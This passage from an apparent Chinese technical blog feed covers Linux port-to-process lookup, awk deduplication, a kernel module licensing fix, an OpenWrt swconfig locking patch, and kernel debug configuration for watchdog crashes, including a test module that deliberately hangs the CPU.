      <content type="html"><![CDATA[<p>根据已知的一个端口号，以telnet默认端口号23为例，去查找系统中监听该端口号的进程，主要可以通过下面3种方式。</p>
<h2 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h2><p>使用<code>netstat</code>可以查看系统网络状态，<code>-p</code>参数可以显示对应的进程信息<code>pid/process</code></p>
<pre><code class="bash">$ netstat -anp |grep &quot;:23&quot;
tcp        0      0 192.168.1.1:23          0.0.0.0:*               LISTEN      3698/utelnetd
tcp        0      0 192.168.1.1:23          192.168.1.10:10381      ESTABLISHED 3698/utelnetd
</code></pre>
<p>从上面的信息中可以看到两条信息：</p>
<ol>
<li>监听23端口的进程是pid为<code>3698</code>的<code>utelnetd</code></li>
<li>目前存在一个已连接的client，client IP为<code>192.168.1.10</code>，tcp连接端口为<code>10381</code></li>
</ol>
<h2 id="lsof"><a href="#lsof" class="headerlink" title="lsof"></a>lsof</h2><p>在<code>Linux</code>系统中，一切皆为文件，socket也不例外，而<code>lsof</code>指令用于<code>list open files</code>，能够显示系统所有已经打开的文件描述符，根据上面已知的进程pid或进程名称，可以grep到相关信息。</p>
<pre><code class="bash">$ lsof |grep utelnetd
3698    /usr/sbin/utelnetd      /dev/console
3698    /usr/sbin/utelnetd      /dev/console
3698    /usr/sbin/utelnetd      /dev/null
3698    /usr/sbin/utelnetd      socket:[12882]
3698    /usr/sbin/utelnetd      socket:[349364]
</code></pre>
<p>可以看出，<code>utelnetd</code>打开了5个文件，对应5个fd(file descriptor)。前面3个分别对应标准输入stdin，标准输出stdout和标准错误输出stderr；接着的两个socket对应的就是<code>netstat</code>显示的1个socket server和1个socket client。</p>
<p><strong>注：</strong>socket:[12882]信息中12882对应的是<code>inode</code>信息，后面<code>proc</code>信息中可以印证。</p>
<h2 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h2><p>除了上面两个指令外，<code>proc</code>文件系统中的信息也是非常常用的，根据已经的进程pid <code>3698</code>，我们可以查看进程已打开的所有文件以及socket信息。</p>
<h3 id="查看文件描述符"><a href="#查看文件描述符" class="headerlink" title="查看文件描述符"></a>查看文件描述符</h3><pre><code class="bash">$ ls -l /proc/3698/fd/
lr-x------    1 root     root            64 Dec 20 07:57 0 -&gt; /dev/console
l-wx------    1 root     root            64 Dec 20 07:57 1 -&gt; /dev/console
l-wx------    1 root     root            64 Dec 20 07:57 2 -&gt; /dev/null
lrwx------    1 root     root            64 Dec 20 07:57 3 -&gt; socket:[12882]
lrwx------    1 root     root            64 Dec 20 07:57 4 -&gt; socket:[349364]
</code></pre>
<p>前3个0,1,2对应的就是stdin,stdout和stderr；3,4对应的就是两条socket连接。</p>
<h3 id="查看socket信息"><a href="#查看socket信息" class="headerlink" title="查看socket信息"></a>查看socket信息</h3><pre><code class="bash">$ cat /proc/3698/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode
     0: 00000000:0D05 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 13663 1 de008000 100 0 0 10 0
   1: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 28897 1 de008500 100 0 0 10 0
   2: 00000000:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 28962 1 de008f00 100 0 0 10 0
   3: 0101A8C0:0017 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 12882 1 dcd20000 100 0 0 10 0
   4: 00000000:01BB 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 28898 1 de008a00 100 0 0 10 0
   5: 0101A8C0:0017 0A01A8C0:288D 01 00000000:00000000 00:00000000 00000000     0        0 349364 1 de00b700 24 8 25 10 -1
</code></pre>
<p>这个文件显示的是当前进程相关的tcp连接信息，目前我们仅考虑端口号为23的连接，由于当前数据均为16进制，所以grep时使用23的16进制数17</p>
<pre><code class="bash">$ grep &quot;17\|sl&quot; /proc/3698/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode
   3: 0101A8C0:0017 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 12882 1 dcd20000 100 0 0 10 0
   5: 0101A8C0:0017 0A01A8C0:288D 01 00000000:00000000 00:00000000 00000000     0        0 349364 1 de00b700 24 8 25 10 -1
</code></pre>
<p>可以看到两个信息，先看其一，local_address为<code>0101A8C0:0017</code>，解析如下:</p>
<pre><code class="sh">01  01  A8  C0:  0017
1   1   168 192: 23
</code></pre>
<p>注意网络地址与本地地址的顺序，转换为10进制便是<code>192.168.1.1:23</code>，其对应的<code>inode</code>就是<code>12882</code>，与<code>lsof</code>看到的一致。</p>
<p>同理，第2条信息，本地地址一致，远程地址<code>0A01A8C0:288D</code>对应10进制<code>192.168.1.10:10381</code>与上述<code>netstat</code>看到的一致。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>根据端口号查找进程及端口相应的fd，可以通过<code>netstat</code>,<code>lsof</code>,<code>proc</code>文件系统3种方式协同完成。</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> socket </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[awk '!a[$0]++'去重小技巧]]></title>
      <url>https://www.litreily.top/2020/01/09/awk_dedup/</url>
      <content type="html"><![CDATA[<p>今天碰到一个关于awk的去重用法，觉得挺有意思的，记录一下</p>
<h2 id="awk-按行去重"><a href="#awk-按行去重" class="headerlink" title="awk 按行去重"></a>awk 按行去重</h2><p><code>awk &#39;!a[$0]++&#39; file</code> 是个神奇的用法，通过它可以实现文件内容去重</p>
<ul>
<li><code>$0</code>: 代表整行</li>
<li><code>a[]</code>: 代表数组a,名称随意,首次调用时为空</li>
<li><code>++</code>:　与<code>C/C++</code>中的<code>++</code>一个含义，<code>i++</code>先使用i后i自增1，<code>++i</code>代表i先自增1然后被使用</li>
<li><code>!</code>: 代表取反</li>
</ul>
<p>所以<code>a[$0]</code>代表对当前行构建一个名为a的数组，首次构建后其值为0</p>
<p><code>a[$0]++</code>代表先使用<code>a[$0]</code>的值，然后<code>a[$0]</code>的值自增1。首次调用自然就是0,下次遇到重复的行就变为1，所以不加<code>!</code>的情况下，该语法用于打印重复项，看下面的例子↓</p>
<pre><code class="bash">$ cat test
aaa
bbb
aaa
ccc
bbb
aaa
ddd
bbb
$ awk &#39;a[$0]++&#39; test
aaa
bbb
aaa
bbb
</code></pre>
<p>它把文件中重复的行都打印出来了。为了去重，我们只需在前面加个取反符<code>!</code>即可，这便是<code>!a[$0]++</code>了</p>
<pre><code class="bash">$ awk &#39;!a[$0]++&#39; test
aaa
bbb
ccc
ddd
</code></pre>
<h2 id="awk-按列去重"><a href="#awk-按列去重" class="headerlink" title="awk 按列去重"></a>awk 按列去重</h2><p>上面使用<code>$0</code>构建数组，如果我们使用第i列的值<code>$i</code>构建数组，使用<code>awk &#39;!a[$i]++&#39; file</code>则可以按照指定列的关键词实现去重↓</p>
<pre><code class="bash">$ cat test
aaa 111
bbb 222
aaa 222
ccc 222
bbb 333
aaa 444
ddd 111
bbb 111
$ awk &#39;!a[$2]++&#39; test
aaa 111
bbb 222
bbb 333
aaa 444
</code></pre>
<p>可以看到，test文件中第2列均不重复，但是其它列允许重复。这种用法在某些特定情况下是非常实用的。</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> shell </tag>
            
            <tag> awk </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[insmod内核模块提示Unknown Symbol问题处理]]></title>
      <url>https://www.litreily.top/2019/11/07/unknown_symbol/</url>
      <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>在调试内核crash问题时打开了<code>lockup</code>相关的kernel CONFIG，重新编译FW后发现有个内核模块insmod失败</p>
<pre><code class="log">[Wed Nov 06 15:51:57.384 2019] ip6t_CONE: Unknown symbol rcu_bh_lock_map (err 0)
[Wed Nov 06 15:51:57.384 2019] ip6t_CONE: Unknown symbol lock_acquire (err 0)
[Wed Nov 06 15:51:57.384 2019] ip6t_CONE: Unknown symbol lock_release (err 0)
</code></pre>
<p>手动使用<code>insmod</code>重新加载也是提示相同的错误。</p>
<h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p>原本这个问题是不存在的，出现的原因必然和启用的CONFIG相关，对比前后两个FW的<code>ip6t_CONE.ko</code></p>
<pre><code class="sh"># old .ko
$ strings ip6t_CONE.ko |grep rcu

# new .ko
$ strings ip6t_CONE.ko |grep rcu
rcu_bh_lock_map
</code></pre>
<p>发现新的<code>.ko</code>确实包含了提示出错的那些个<code>symbol</code>，为了找出这些参数是启用哪个CONFIG引入的，可以去查找kernel的sourcecode</p>
<p><img src="/assets/kernel/export_symbol.png" alt="export symbol rcu_bh_lock_map"></p>
<p>Got you, 就是这个<code>CONFIG_DEBUG_LOCK_ALLOC</code>，这个CONFIG正是之前打开lockup相关CONFIG之一。当然其它两个报错的Symbol也是类似的情况。</p>
<p>对应的CONFIG找到了，但是本来就需要通过这个CONFIG去记录相关log，当然不然又把它禁掉，加载失败的问题也正是打开这个CONFIG才发现的，说明是个潜在问题。那么如何解决呢，首先我们以为是这些<code>Symbol</code>在内核中已经导出了，但是<code>ipv6_CONE.ko</code>没有引用的缘故，所以尝试在源文件<code>ipv6_CONE.c</code>中使用extern调用。</p>
<pre><code class="c">extern struct lockdep_map rcu_bh_lock_map;
extern void lock_acquire(struct lockdep_map *lock, unsigned int subclass,
              int trylock, int read, int check,
              struct lockdep_map *nest_lock, unsigned long ip);
extern void lock_release(struct lockdep_map *lock, int nested,
              unsigned long ip);
</code></pre>
<p>事实证明这个方法<strong>不可行</strong>，说明不是这个思路，所以重新开始了Google之路，终于！万能的<code>StackOverflow</code>让我看到了希望</p>
<blockquote>
<p><strong>问题</strong>：<a href="https://stackoverflow.com/questions/29578931/unknown-symbol-class-create-err-0" target="_blank" rel="noopener">unknown symbol __class_create (err 0)</a></p>
<p>The function <code>__class_create</code> is exported only for GPL modules (exported with <strong>EXPORT_SYMBOL_GPL</strong>). So, you need to use a GPL license with MODULE_LICENSE macro to make use of that function. Same goes for other functions as well.</p>
<p>This should do the trick:<br><strong>MODULE_LICENSE(&quot;GPL&quot;);</strong></p>
</blockquote>
<p>发现这个问题和我遇到的情况基本一致，然后我重新检查了这几个Symbol的export方式，确实都是<code>EXPORT_SYMBOL_GPL</code>，接着我再去看<code>ip6t_CONE</code>的sourcecode，发现确实没有声明LICENSE！！！</p>
<p>好了，解决方案来啦，立马加个kernel patch ↓</p>
<pre><code class="patch">--- kmod-ipv6-cone.orig/ip6t_cone.c 2019-11-07 09:46:42.068839345 +0800
--- kmod-ipv6-cone/ip6t_cone.c 2019-11-07 09:47:45.956071600 +0800
@@ -466,3 +466,8 @@
 module_init(init);
 module_exit(fini);
 #endif
+
+MODULE_LICENSE(&quot;GPL&quot;);
+MODULE_AUTHOR(&quot;&quot;);
+MODULE_DESCRIPTION(&quot;IPv6&quot;);
+
</code></pre>
<p>加上重新编译，一切ok，那些恼人的log终于不见啦，<code>ip6t_CONE.ko</code>也正常加载完成，完美！</p>
<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul>
<li><a href="https://stackoverflow.com/questions/29578931/unknown-symbol-class-create-err-0" target="_blank" rel="noopener">unknown symbol __class_create (err 0)</a></li>
<li><a href="http://tuxthink.blogspot.com/2011/07/exporting-symbols-from-module.html" target="_blank" rel="noopener">Exporting symbols from module</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> IPv6 </tag>
            
            <tag> kernel </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[openwrt swconfig stack trace分析]]></title>
      <url>https://www.litreily.top/2019/11/06/swconfig_crash/</url>
      <content type="html"><![CDATA[<p>接上一篇博客 <a href="/2019/11/03/kernel_debug/" title="watchdog bite导致系统重启问题的调试">watchdog bite导致系统重启问题的调试</a> ，打开调试功能后开始压力测试，在测试过程中发现DUT每隔2s打印一次以下异常信息</p>
<pre><code class="log">BUG: sleeping function called from invalid context at kernel/locking/mutex.c:616
in_atomic(): 1, irqs_disabled(): 0, pid: 9465, name: swconfig
INFO: lockdep is turned off.
CPU: 2 PID: 9465 Comm: swconfig Tainted: P        W    3.14.77 #1
[&lt;c021561c&gt;] (unwind_backtrace) from [&lt;c0211d44&gt;] (show_stack+0x18/0x1c)
[&lt;c0211d44&gt;] (show_stack) from [&lt;c062ea98&gt;] (dump_stack+0x9c/0xd4)
[&lt;c062ea98&gt;] (dump_stack) from [&lt;c06312d8&gt;] (mutex_lock_nested+0x2c/0x450)
[&lt;c06312d8&gt;] (mutex_lock_nested) from [&lt;c0499df8&gt;] (swconfig_get_dev+0x70/0x88)
[&lt;c0499df8&gt;] (swconfig_get_dev) from [&lt;c049a808&gt;] (swconfig_list_attrs+0x20/0x20c)
[&lt;c049a808&gt;] (swconfig_list_attrs) from [&lt;c054fde8&gt;] (genl_rcv_msg+0x260/0x2e0)
[&lt;c054fde8&gt;] (genl_rcv_msg) from [&lt;c054f2d0&gt;] (netlink_rcv_skb+0x60/0xbc)
[&lt;c054f2d0&gt;] (netlink_rcv_skb) from [&lt;c054fb74&gt;] (genl_rcv+0x28/0x3c)
[&lt;c054fb74&gt;] (genl_rcv) from [&lt;c054ec94&gt;] (netlink_unicast+0x11c/0x1d0)
[&lt;c054ec94&gt;] (netlink_unicast) from [&lt;c054f114&gt;] (netlink_sendmsg+0x30c/0x368)
[&lt;c054f114&gt;] (netlink_sendmsg) from [&lt;c050fb78&gt;] (sock_sendmsg+0x78/0x8c)
[&lt;c050fb78&gt;] (sock_sendmsg) from [&lt;c0511310&gt;] (___sys_sendmsg.part.3+0x184/0x20c)
[&lt;c0511310&gt;] (___sys_sendmsg.part.3) from [&lt;c0512340&gt;] (__sys_sendmsg+0x54/0x78)
[&lt;c0512340&gt;] (__sys_sendmsg) from [&lt;c020df40&gt;] (ret_fast_syscall+0x0/0x50)
</code></pre>
<h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p>每隔2s是因为在<code>detcable</code>模块的主循环中执行了以下代码，并且在while循环中每2s执行一次。</p>
<pre><code class="c">system(&quot;/sbin/swconfig dev switch0 show |grep \&quot;link: port\&quot; &gt; /tmp/switch);
</code></pre>
<p>根据log首行提示<code>kernel/locking/mutex.c:616</code>找到相关代码：</p>
<p><img src="/assets/kernel/mutex.c.png" alt="mutex.c:616"></p>
<p>在内核代码中搜索<code>might_sleep</code>找到其定义于<code>include/linux/kernel.h</code></p>
<p><img src="/assets/kernel/might_sleep.png" alt="kernel.h might_sleep"></p>
<p>从说明信息可以看出，这些<code>stack trace</code>提示<code>swconfig</code>进程运行过程中进入内核态时可能进入不被允许的睡眠状态。而这些信息是在启用<code>CONFIG_DEBUG_ATOMIC_SLEEP</code>后打印的，该CONFIG是在启用lockup相关调试功能时打开，所以想要停止打印可以禁用该CONFIG。</p>
<p>但是实际上这个问题是swconfig的内核驱动导致的，具体代码如下：</p>
<p><img src="/assets/kernel/swconfig_drivers.png" alt="swconfig drviers"></p>
<p><code>spinlock</code>自旋锁不允许临界区有触发sleep的函数，而<code>mutex_lock</code>正好就是可能进入sleep状态的函数，所以才触发了这个stack trace</p>
<blockquote>
<p><strong>mutex_lock</strong> — acquire the mutex<br>Lock the mutex exclusively for this task. If the mutex is not available right now, it will sleep until it can get it.</p>
</blockquote>
<p>为了解决这个问题，可以将加锁方式由<code>spin_lock</code>改为<code>mutex_lock</code>，这个解决方案是组长<code>google</code>来的，我这是拾人牙慧了，哈哈哈。</p>
<pre><code class="patch">index 78569a9..e8a6847 100644 (file)
--- a/target/linux/generic/files/drivers/net/phy/swconfig.c
+++ b/target/linux/generic/files/drivers/net/phy/swconfig.c
@@ -36,7 +36,7 @@ MODULE_LICENSE(&quot;GPL&quot;);

 static int swdev_id;
 static struct list_head swdevs;
-static DEFINE_SPINLOCK(swdevs_lock);
+static DEFINE_MUTEX(swdevs_lock);
 struct swconfig_callback;

 struct swconfig_callback {
@@ -296,13 +296,13 @@ static struct nla_policy link_policy[SWITCH_LINK_ATTR_MAX] = {
 static inline void
 swconfig_lock(void)
 {
-       spin_lock(&amp;swdevs_lock);
+       mutex_lock(&amp;swdevs_lock);
 }

 static inline void
 swconfig_unlock(void)
 {
-       spin_unlock(&amp;swdevs_lock);
+       mutex_unlock(&amp;swdevs_lock);
 }

 static struct switch_dev *
</code></pre>
<p>加入patch后完美解决问题。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.kernel.org/doc/htmldocs/kernel-locking/API-mutex-lock.html" target="_blank" rel="noopener">API mutex_lock</a></li>
<li><a href="https://git.openwrt.org/?p=openwrt/openwrt.git;a=commitdiff;h=ed3860c3e3ebe484c00cf603c29e68af28eb0839;ds=inline" target="_blank" rel="noopener">swconfig: convert swdevs_lock from spinlock to mutex</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> openwrt </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[watchdog bite导致系统重启问题的调试]]></title>
      <url>https://www.litreily.top/2019/11/03/kernel_debug/</url>
      <content type="html"><![CDATA[<h2 id="背景说明"><a href="#背景说明" class="headerlink" title="背景说明"></a>背景说明</h2><p>ST在做stress test过程中发现一个bug，DUT会在工作一段时间后重启，重启原因是<code>watchdog bite</code></p>
<pre><code class="txt">[Thu Sep 26 09:21:59.734 2019] Watchdog bark! Now = 831425.568038
[Thu Sep 26 09:21:59.734 2019] Causing a watchdog bite!
[Thu Sep 26 09:21:59.734 2019] Configuring Watchdog Timer
[Thu Sep 26 09:21:59.734 2019] Wa
</code></pre>
<p>但是无法确定根本原因是什么，是什么导致的死锁，让watchdog没办法在规定时间内bark。为此，我们需要启用相关的内核调试手段去获取相关信息，然后深入分析crashdump和console log。</p>
<h2 id="内核裁剪"><a href="#内核裁剪" class="headerlink" title="内核裁剪"></a>内核裁剪</h2><h3 id="启用ftrace"><a href="#启用ftrace" class="headerlink" title="启用ftrace"></a>启用ftrace</h3><blockquote>
<p><strong>Ftrace</strong> is an internal tracer designed to help out developers and designers of systems to find what is going on inside the kernel. It can be used for debugging or analyzing latencies and performance issues that take place outside of user-space.</p>
</blockquote>
<p><code>Ftrace</code>是一个内部跟踪器，用于追踪内核运行情况，帮助调试用户空间之外的潜在问题或性能问题。根据QCA提供的帮助文档，可以通过以下步骤开启ftrace功能。</p>
<ol>
<li>From &quot;make menuconfig&quot;, go to --&gt; &quot;Global Build Settings&quot; then go to --&gt; &quot;Compile kernel with tracing support&quot;</li>
<li>In the &quot;Compile kernel with tracing support&quot;, enable the below options :-<ul>
<li>Enable/disable function tracing dynamically</li>
<li>Trace process context switches and events</li>
<li>Function tracer</li>
</ul>
</li>
<li>Once above changes are done, then from the &quot;make kernel_menuconfig&quot;, go to --&gt; &quot;Kernel hacking&quot; --&gt; then enable the below options in &quot;Tracers&quot;:-<ul>
<li>Kernel Function Tracer</li>
<li>enable/disable function tracing dynamically</li>
</ul>
</li>
</ol>
<p>可以看出，配置分两个部分完成，<code>make menuconfig</code>及<code>make kernel_menuconfig</code></p>
<p><img src="/assets/kernel/menuconfig_ftrace.png" alt="make menuconfig"></p>
<p>使用图形化界面配置menuconfig如上，保存后对应的.config文件会随之更改</p>
<pre><code class="patch"> # CONFIG_KERNEL_PROFILIING is not set
 CONFIG_KERNEL_KALLSYMS=y
 # CONFIG_KERNEL_KALLSYMS_ALL is not set
-# CONFIG_KERNEL_FTRACE is not set
+CONFIG_KERNEL_FTRACE=y
+# CONFIG_KERNEL_FTRACE_SYSCALLS is not set
+CONFIG_KERNEL_ENABLE_DEFAULT_TRACERS=y
 # CONFIG_KERNEL_DEBUG_KMEMLEAK is not set
+CONFIG_KERNEL_FUNCTION_TRACER=y
+# CONFIG_KERNEL_FUNCTION_GRAPH_TRACER is not set
+CONFIG_KERNEL_DYNAMIC_FTRACE=y
+# CONFIG_KERNEL_FUNCTION_PROFILER is not set
 # CONFIG_KERNEL_IRQSOFF_TRACER is not set
 # CONFIG_KERNEL_PREEMPT_TRACER is not set
 CONFIG_KERNEL_DEBUG_KERNEL=y
</code></pre>
<p>但是在<code>openWrt</code>中使用<code>make kernel_menuconfig</code>会打乱原有的配置选项，所以需要手动修改配置文件</p>
<pre><code class="patch">@@ -3301,8 +3304,26 @@ CONFIG_HAVE_FTRACE_MCOUNT_RECORD=y
 CONFIG_HAVE_SYSCALL_TRACEPOINTS=y
 CONFIG_HAVE_C_RECORDMCOUNT=y
 CONFIG_TRACING_SUPPORT=y
-# CONFIG_FTRACE is not set
-
+CONFIG_FTRACE=y
+CONFIG_FUNCTION_TRACER=y
+CONFIG_DYNAMIC_FTRACE=y
+# CONFIG_NET_DROP_MONITOR is not set
+# CONFIG_FUNCTION_GRAPH_TRACER is not set
+# CONFIG_IRQSOFF_TRACER is not set
+# CONFIG_PREEMPT_TRACER is not set
+# CONFIG_SCHED_TRACER is not set
+# CONFIG_FTRACE_SYSCALLS is not set
+# CONFIG_TRACER_SNAPSHOT is not set
+CONFIG_BRANCH_PROFILE_NONE=y
+# CONFIG_PROFILE_ANNOTATED_BRANCHES is not set
+# CONFIG_PROFILE_ALL_BRANCHES is not set
+# CONFIG_STACK_TRACER is not set
+# CONFIG_BLK_DEV_IO_TRACE is not set
+# CONFIG_FUNCTION_PROFILER is not set
+# CONFIG_FTRACE_STARTUP_TEST is not set
+# CONFIG_RING_BUFFER_STARTUP_TEST is not set
+# CONFIG_RING_BUFFER_BENCHMARK is not set
+#
 #
 # Runtime Testing
 #
</code></pre>
<p>对应的图形化配置如下：</p>
<p><img src="/assets/kernel/kernel_menuconfig_ftrace.png" alt="kernel_menuconfig ftrace"></p>
<h3 id="启用lockup-debug"><a href="#启用lockup-debug" class="headerlink" title="启用lockup debug"></a>启用lockup debug</h3><p>为了打印出现死锁后的相关信息，需要打开相应的配置参数</p>
<pre><code class="patch">@@ -3249,9 +3249,9 @@ CONFIG_HAVE_DEBUG_KMEMLEAK=y
 # Debug Lockups and Hangs
 #
 CONFIG_LOCKUP_DETECTOR=y
-# CONFIG_BOOTPARAM_SOFTLOCKUP_PANIC is not set
+CONFIG_BOOTPARAM_SOFTLOCKUP_PANIC=y
 CONFIG_BOOTPARAM_SOFTLOCKUP_PANIC_VALUE=0
-# CONFIG_DETECT_HUNG_TASK is not set
+CONFIG_DETECT_HUNG_TASK=y
 # CONFIG_PANIC_ON_OOPS is not set
 CONFIG_PANIC_ON_OOPS_VALUE=0
 CONFIG_PANIC_TIMEOUT=3
@@ -3259,20 +3259,21 @@ CONFIG_PANIC_TIMEOUT=3
 # CONFIG_SCHEDSTATS is not set
 # CONFIG_TIMER_STATS is not set
 # CONFIG_DEBUG_PREEMPT is not set
-
+CONFIG_DEFAULT_HUNG_TASK_TIMEOUT=120
+CONFIG_BOOTPARAM_HUNG_TASK_PANIC=y
 #
 # Lock Debugging (spinlocks, mutexes, etc...)
 #
-# CONFIG_DEBUG_RT_MUTEXES is not set
-# CONFIG_RT_MUTEX_TESTER is not set
-# CONFIG_DEBUG_SPINLOCK is not set
-# CONFIG_DEBUG_MUTEXES is not set
-# CONFIG_DEBUG_WW_MUTEX_SLOWPATH is not set
-# CONFIG_DEBUG_LOCK_ALLOC is not set
-# CONFIG_PROVE_LOCKING is not set
-# CONFIG_LOCK_STAT is not set
-# CONFIG_DEBUG_ATOMIC_SLEEP is not set
-# CONFIG_DEBUG_LOCKING_API_SELFTESTS is not set
+CONFIG_DEBUG_RT_MUTEXES=y
+CONFIG_RT_MUTEX_TESTER=y
+CONFIG_DEBUG_SPINLOCK=y
+CONFIG_DEBUG_MUTEXES=y
+CONFIG_DEBUG_WW_MUTEX_SLOWPATH=y
+CONFIG_DEBUG_LOCK_ALLOC=y
+CONFIG_PROVE_LOCKING=y
+CONFIG_LOCK_STAT=y
+CONFIG_DEBUG_ATOMIC_SLEEP=y
+CONFIG_DEBUG_LOCKING_API_SELFTESTS=y
 # CONFIG_DEBUG_KOBJECT is not set
 CONFIG_DEBUG_BUGVERBOSE=y
 # CONFIG_DEBUG_WRITECOUNT is not set
@@ -3280,6 +3281,8 @@ CONFIG_DEBUG_BUGVERBOSE=y
 # CONFIG_DEBUG_SG is not set
 # CONFIG_DEBUG_NOTIFIERS is not set
 # CONFIG_DEBUG_CREDENTIALS is not set
+CONFIG_DEBUG_LOCKDEP=y
+# CONFIG_PROVE_RCU is not set
</code></pre>
<p>其中有些看似不相干的config（如<code>CONFIG_PROVE_RCU</code>）被设置成了<code>is not set</code>，这是和某些lockup配置相关的依赖关系决定的，如果没有显式设置的话，每次编译都会让你手动选择是否启用。如果使用下面的图形化界面配置就不需要手动添加了，因为它会自动处理各种依赖关系。</p>
<p><img src="/assets/kernel/kernel_menuconfig_lockup.png" alt="kernel_menuconfig lockup"></p>
<h3 id="移除未使用的内核模块"><a href="#移除未使用的内核模块" class="headerlink" title="移除未使用的内核模块"></a>移除未使用的内核模块</h3><p>由于启用了大量的调试信息，开机启动无线模块时会提示内存不足的情况，从而导致无线模块无法工作。</p>
<pre><code class="log">ath_dev: Copyright (c) 2001-2007 Atheros Communications, Inc, All Rights Reserved
ath_da_pci:  (Atheros/multi-bss)
DHCPv6 client is not running! Return
vmap allocation for size 1064960 failed: use vmalloc=&lt;size&gt; to increase size.
vmalloc: allocation failure: 1060629 bytes
insmod: page allocation failure: order:0, mode:0xd0
......
ath_dev: driver unloaded
ath_tx99: driver unloaded
ath_rate_atheros: driver unloaded
ath_hal: driver unloaded
ath_spectral: driver unloaded
ath_dfs: driver unloaded
phy for wifi device wifi0 not found
wifi0(qcawifi): enable failed
qcawifi: enable radio wifi1
</code></pre>
<p>为此可以将部分未使用的内核模块移除。</p>
<ol>
<li>Bluetooth driver</li>
<li>SOUND driver</li>
<li>IDE &amp; SCSI driver</li>
<li>Filesystems not used</li>
</ol>
<p>可以通过直接修改内核配置文件<code>target/linux/ipq806x/config_dni-3.14</code>完成裁剪。</p>
<h2 id="添加内核测试模块-kmod-dead"><a href="#添加内核测试模块-kmod-dead" class="headerlink" title="添加内核测试模块 kmod-dead"></a>添加内核测试模块 kmod-dead</h2><p>QCA为了测试<code>watchdog</code>问题，提供了一个内核测试模块，通过该模块可以手动触发系统crash</p>
<p><code>kmod-dead</code>的目录结构如下：</p>
<pre><code class="sh">kmod-dead
├── Makefile
└── src
    ├── dead.c
    ├── Kconfig
    └── Makefile
</code></pre>
<h3 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h3><p>模块根目录的Makefile仿其它内核模块(<code>kmod-urlblock</code>)编写</p>
<pre><code class="Makefile">include $(TOPDIR)/rules.mk
include $(INCLUDE_DIR)/kernel.mk

PKG_RELEASE:=1
PKG_NAME:=kmod-dead

PKG_BUILD_DIR:=$(KERNEL_BUILD_DIR)/$(PKG_NAME)

include $(INCLUDE_DIR)/package.mk

define KernelPackage/dead
  SUBMENU:=Other modules
  TITLE:=kernel dead
  VERSION:=$(LINUX_VERSION)-$(BOARD)-$(PKG_RELEASE)
  FILES:= $(PKG_BUILD_DIR)/dead.$(LINUX_KMOD_SUFFIX)
# AUTOLOAD:=$(call AutoLoad,46,dead)
endef

define Build/Prepare
    mkdir -p $(PKG_BUILD_DIR)
    $(CP) ./src/* $(PKG_BUILD_DIR)
endef

define Build/Compile
    $(MAKE) -C &quot;$(LINUX_DIR)&quot; \
        CROSS_COMPILE=&quot;$(TARGET_CROSS)&quot; \
        ARCH=&quot;$(LINUX_KARCH)&quot; \
        SUBDIRS=&quot;$(PKG_BUILD_DIR)&quot; \
        EXTRA_CFLAGS=&quot;$(BUILDFLAGS)&quot; \
        modules
endef

define KernelPackage/dead/install
    $(INSTALL_DIR) $(1)/lib/network/
endef

$(eval $(call KernelPackage,dead))
</code></pre>
<p>Makefile中将<code>AUTOLOAD</code>所在行注释掉是为了禁止模块自动加载，导致系统刚刚启动就crash，然后无限重启。</p>
<h3 id="src-dead-c"><a href="#src-dead-c" class="headerlink" title="src/dead.c"></a>src/dead.c</h3><pre><code class="c">#include &lt;linux/kernel.h&gt;
#include &lt;linux/init.h&gt;
#include &lt;linux/module.h&gt;
#include &lt;linux/kthread.h&gt;
#include &lt;linux/spinlock_types.h&gt;

static DEFINE_SPINLOCK(test_lock);

static int process_test(void *info)
{
    spin_lock(&amp;test_lock);
    while(1);
    return 0;
}

static int __init init_3mb_alloc(void)
{
    struct task_struct *p1, *p2, *p3, *p4;
    printk(&quot;MODULE\tINITIALIZED\n&quot;);

    p1 = kthread_create(process_test, NULL, &quot;TEST_CPU_1_THREAD&quot;);
    kthread_bind(p1,0);

    p2 = kthread_create(process_test, NULL, &quot;TEST_CPU_2_THREAD&quot;);
    kthread_bind(p2,0);

    p3 = kthread_create(process_test, NULL, &quot;TEST_CPU_3_THREAD&quot;);
    kthread_bind(p3,0);

    p4 = kthread_create(process_test, NULL, &quot;TEST_CPU_4_THREAD&quot;);
    kthread_bind(p4,0);

    wake_up_process(p1);
    wake_up_process(p2);
    wake_up_process(p3);
    wake_up_process(p4);

    return 0;
}

static void __exit exit_3mb_alloc(void)
{
    printk(&quot;MODULE\tTERMINATED\n&quot;);
}

module_init(init_3mb_alloc);
module_exit(exit_3mb_alloc);

MODULE_LICENSE(&quot;GPL&quot;);
